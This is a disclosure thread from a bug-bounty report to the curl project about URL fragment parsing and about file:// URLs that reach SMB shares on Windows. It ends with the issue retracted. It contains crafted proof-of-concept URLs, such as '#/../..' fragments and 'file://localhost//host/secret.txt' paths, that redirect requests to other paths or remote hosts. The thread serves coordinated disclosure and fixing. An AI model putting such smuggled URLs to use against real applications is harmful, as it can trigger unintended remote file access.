title: SMB access smuggling via FILE URL on Windows

profile.name: curl
profile.about: cURL is a computer software project providing a library and command-line tool for transferring data using various protocols.

vulnerability_information:
## Summary:

While CURL 7.62 > parses URLs that have an ? (parameter separator) char after the # (fragment separator), CURL urlapi code treats the path with the hash part as it being the same one, this may allow some problem on specific protocols that may have a security impact.
On HTTP, an attacker may be able to modify original requests by appending "?" to the fragment part of the URL, see first example.
On FILE, CURL can be confused while requesting FILE urls to get a file from a different server that the user intended on Windows as the FILE protocol on Windows supports SMB. 

## Steps To Reproduce:
HTTP Example:
```
fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl -v "http://localhost/safepath/something#/../../anotherpath/somethingelse"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

*   Trying ::1:80...
* TCP_NODELAY set
* Connected to localhost (::1) port 80 (#0)
> GET /safepath/something HTTP/1.1
> Host: localhost
> User-Agent: curl/7.66.0
> Accept: */*
>

fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl -v "http://localhost/safepath/something#/../../anotherpath/somethingelse?"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

*   Trying ::1:80...
* TCP_NODELAY set
* Connected to localhost (::1) port 80 (#0)
> GET /anotherpath/somethingelse? HTTP/1.1
> Host: localhost
> User-Agent: curl/7.66.0
> Accept: */*
>
```

File example:
```
fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl "file://localhost/windows/win.ini"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    92  100    92    0     0  46000      0 --:--:-- --:--:-- --:--:-- 46000
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1


fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl "file://localhost/windows/win.ini#/../..//192.168.88.248/home/secret.txt"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    92  100    92    0     0  46000      0 --:--:-- --:--:-- --:--:-- 46000
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1

fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl "file://localhost/windows/win.ini#/../..//192.168.88.248/home/secret.txt?"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    33  100    33    0     0   2750      0 --:--:-- --:--:-- --:--:--  2750
file on different smb server/path
```

## Impact

Modify expected request behavior  on several protocols

activities.message: Thanks. We will investigate!

First: this bug was already reported in issue [4412](https://github.com/curl/curl/issues/4412) and fixed in [4413](https://github.com/curl/curl/issues/4413) on September 24, 2019. (Not shipped in a release yet)

Secondly: *"the FILE protocol on Windows supports SMB"* is not globally true. The FILE protocol spec doesn't mention how non-localhost accesses should be done so curl don''t do them at all, on any platform. You also cannot ".." your way into changing the host of a URL as the ".." handling is only done in the path part (when curl "normalizes" them before use).

Left is still the risk that a curl-using application accepts input from a user and appends that to the end of a URL that is using fragments, and then if the user then includes a question mark (`?`) it can trick curl into issuing a request to a different path on the server. This can probably be viewed as a security problem, if rather limited in scope when it works and I would guess that *very* few applications actually accept free-text user input like this and just appends it to fragment-using URLs and expect that to be a secure method.

Hello Daniel, 

I didn't notice that it was fixed on head, my bad, I just checked the last released version.
Regarding the second point, I understand and agree that CURL is not doing the SMB access, that is a Windows feature. The ".." doesn't get to the HOST part, its somewhat confusing for me on the FILE protocol at least because I can clearly change the host its connecting, it may be a Windows thing only too :

```
fmunozs@ashes MINGW64 ~/Downloads/curl-7.62.0-win64-mingw/bin
$ curl  "file://localhost/windows/win.ini#/../..//live.sysinternals.com/About_This_Site.txt?"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   668  100   668    0     0  74222      0 --:--:-- --:--:-- --:--:-- 74222What is this?

This is a file share allowing access to all Sysinternals utilities. We have developed this to test an alternate distribution mechanism for our utilities.

This will allow you to run these tools from any computer connected to the Internet without having to navigate to a webpage, download and extract the zip file.

If you are unfamiliar with Microsoft Windows Sysinternals, it is highly recommended that you visit the website at http://technet.microsoft.com/sysinternals before using these tools.

If you have any questions or comments on this file share, please email syssite@microsoft.com

Regards,

The Microsoft Windows Sysinternals Team
```

On HTTP I agree that ".." will not reach the HOST part.

Regards
I'm attaching screenshots from Process Monitor. You can use the example above from any Windows computer, live.sysinternals.com is publicly available.

I don't run Windows so I cannot check, but to get that I presume the regular open() call magically does SMB if the right input is given - I had no idea. The dotdot removal thing in curl is done on the path only but if windows magically under the hood does SMB, then I suppose it can happen.  I'll file this under the "yet another weirdo thing Windows does" .

It still requires that an application would allow a user input to for the URL or get appended to the URL using fragments.

Does a plain command line like the one below also "open" that remote file on sysinternals.com?

    curl  "file://localhost///live.sysinternals.com/About_This_Site.txt"

Hello Daniel, 

No. It fails:
```
fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl "file://localhost///live.sysinternals.com/About_This_Site.txt"
curl: (37) Couldn't open file ///live.sysinternals.com/About_This_Site.txt
```
I did some additional tests and I see something, two slashes after the hostname, will make the request go to SMB.

```
$ ./curl "file://localhost//live.sysinternals.com/About_This_Site.txt"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   668  100   668    0     0   130k      0 --:--:-- --:--:-- --:--:--  130kWhat is this?

This is a file share allowing access to all Sysinternals utilities. We have developed this to test an alternate distribution mechanism for our utilities.
...
```
The following one also goes to SMB:
```
$ ./curl "file://localhost//./live.sysinternals.com/About_This_site.txt"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   668  100   668    0     0   217k      0 --:--:-- --:--:-- --:--:--  217kWhat is this?

This is a file share allowing access to all Sysinternals utilities. We have developed this to test an alternate distribution mechanism for our utilities.
...
```

The following request fails on Windows because there's a check on urlapi.c that only allows hostname 127.0.0.1 and localhost on file protocol https://github.com/curl/curl/blob/master/lib/urlapi.c#L739 

Without that check, I assume that it would go to the SMB Server

```
fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl "file://live.sysinternals.com/About_This_Site.txt"
curl: (3) URL using bad/illegal format or missing URL
```
If I specify a request, with an empty host "///" and then try to dotdot on the path, the request goes to the SMB server.

```
$ ./curl "file:///..//live.sysinternals.com/About_This_Site.txt"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   668  100   668    0     0   163k      0 --:--:-- --:--:-- --:--:--  163kWhat is this?

This is a file share allowing access to all Sysinternals utilities. We have developed this to test an alternate distribution mechanism for our utilities.
...
```
The same happens when I use localhost/127.0.0.1 as hostname:
```
$ ./curl "file://localhost/..//live.sysinternals.com/About_This_Site.txt"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   668  100   668    0     0  83500      0 --:--:-- --:--:-- --:--:-- 83500What is this?

This is a file share allowing access to all Sysinternals utilities. We have developed this to test an alternate distribution mechanism for our utilities.
...
```

I'm on IRC too as fmunozs if you need me to do any quick test.

Regards

I think this is potentially the larger security issue here.

Is this as surprising to normal Windows users as it is to me? Is this a way to "smuggle" SMB accesses into an application or script that think it makes a local file:// accesses?

(Separate note, there's a curl release pending on November 6 but since this is still a developing issue, there's no expectation that we have a fix in this release. Let's aim for the next scheduled release or possibly a dedicated patch release before that.)

Hello Daniel, 

I built master and applied this patch, I can confirm that I can nolonger reach SMB.

Old version:
```
C:\Users\fmunozs\Downloads\curl-7.66.0_2-win64-mingw\curl-7.66.0-win64-mingw\bin>curl -V
curl 7.66.0 (x86_64-pc-win32) libcurl/7.66.0 OpenSSL/1.1.1d (Schannel) zlib/1.2.11 brotli/1.0.7 WinIDN libssh2/1.9.0 nghttp2/1.39.2
Release-Date: 2019-09-11
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp
Features: AsynchDNS HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile MultiSSL NTLM SPNEGO SSL SSPI TLS-SRP brotli libz

C:\Users\fmunozs\Downloads\curl-7.66.0_2-win64-mingw\curl-7.66.0-win64-mingw\bin>curl "file://localhost/..//rem/home/secret.txt"
file on different smb server/path

C:\Users\fmunozs\Downloads\curl-7.66.0_2-win64-mingw\curl-7.66.0-win64-mingw\bin>curl "file://localhost//rem/home/secret.txt"
file on different smb server/path
```
Patched:
```
C:\tools\curl-master\builds\libcurl-vc-x86-release-static-ipv6-sspi-winssl\bin>curl -V
curl 7.67.1-DEV (i386-pc-win32) libcurl/7.67.1-DEV Schannel WinIDN
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp
Features: AsynchDNS IDN IPv6 Kerberos Largefile NTLM SPNEGO SSL SSPI UnixSockets

C:\tools\curl-master\builds\libcurl-vc-x86-release-static-ipv6-sspi-winssl\bin>curl "file://localhost//rem/home/secret.txt"
curl: (37) Couldn't open file //rem/home/secret.txt

C:\tools\curl-master\builds\libcurl-vc-x86-release-static-ipv6-sspi-winssl\bin>curl "file://localhost/..//rem/home/secret.txt"
curl: (37) Couldn't open file //rem/home/secret.txt
```

However, it worries me a bit that it will break access to these kind of file: urls with multiple slashes at the root path, which have never worked under CURL for windows though but do work with Windows Chrome and on UNIX.

```
C:\tools\curl-master\builds\libcurl-vc-x86-release-static-ipv6-sspi-winssl\bin>curl "file://localhost//C:/windows/win.ini"
curl: (37) Couldn't open file //C:/windows/win.ini
```

Ubuntu:

```
root@ubuntu-perla:/home/perla/phishing_catch# curl file://localhost///etc/issue
Ubuntu 18.04.1 LTS \n \l
```
Those working paths with `\\` in the beginning on Windows then must only have a drive letter and colon immediately following the double-slash, right?

Hello Daniel, I did some test and it seems its just Chrome 'normalizing' the path (removing duplicates /) before trying to access it. I think the patch its good, but if you don't mind allowing me to work on some tests before publishing it, it would be great.

additional_data.new_title: SMB access smuggling via FILE URL on Windows

activities.message:
I couldn't find any better CWE match... :-(

@fms: the plan is still to work on this issue and publish in sync with the next public release, so there's plenty of time...

Here's my first take at a security advisory for this flaw:

SMB access smuggling via FILE URL on Windows
============================================

Project curl Security Advisory, January 8th 2020 -
[Permalink](https://curl.haxx.se/docs/CVE-2019-zzzz.html)

VULNERABILITY
-------------

libcurl can be told to load a file from a `FILE://` URL. It will then load the
file from the path specified in the URL from the local file system.

If you craft the given path so that it starts with two slashes (or
backslashes) followed by a host name, Windows will automatically treat that as
a request to access the host name using SMB instead of reading a local file
with that name. This is not expected nor documented libcurl behavior.

Applications letting users provide URLs or parts of URLs could be vulnerable
to this. Both the curl tool and library.

Example URL exploiting this: `file://localhost//hostname/home/secret.txt`.

We are not aware of any exploit of this flaw.

INFO
----

This bug only exists when libcurl runs on a Microsoft Windows operating
system.

This bug exist in the first code import we have, from 1999.

The Common Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2019-zzzz to this issue.

CWE-20: Improper Input Validation

Severity: 3.0 (Low)

AFFECTED VERSIONS
-----------------

- Affected versions: all versions to and including 7.67.0
- Not affected versions: libcurl >= 7.68.0

libcurl is used by many applications, but not always advertised as such.

THE SOLUTION
------------

A [fix for CVE-2019-zzzz](patch URL)

RECOMMENDATIONS
--------------

We suggest you take one of the following actions immediately, in order of
preference:

 A - Upgrade curl to version 7.68.0

 B - Apply the patch to your version and rebuild
 
 C - do not use `FILE://` URLs

TIMELINE
--------

The issue was reported to the curl project on October 31, 2019. The initial
fix was done, verified and communicated with the reporter on November 7, 2019.

We contacted distros@openwall on XXXXX.

This advisory was posted on January 8th 2020.

CREDITS
-------

Reported by Fernando Muñoz. Patch by Daniel Stenberg.

Thanks a lot!
I've requested a CVE for this.
Thanks a lot @fms for your work and report. We've decided to reward you 400 USD for this issue.
Let's disclose

For the record: this issue was later retracted and is no longer considered a security flaw in curl. This is just the way Windows works and it cannot be prevented by applications.  The associated CVE has also been redacted.

Hello Daniel, I understand that this issue was rejected, however if its possible I'd like to discuss it on IRC when you have availability. I've given a donation of 200 to CURL project to return part of the bounty, I'll finish returning next month.

I'm around on IRC to discuss it virtually every day, most reliably on week days.

But please, you're under no obligation to pay anything back. We *did* consider it a problem at the time we rewarded you this. That money is yours. Please keep it.
I'd like us to be able to show the world how we reasoned on tthis.
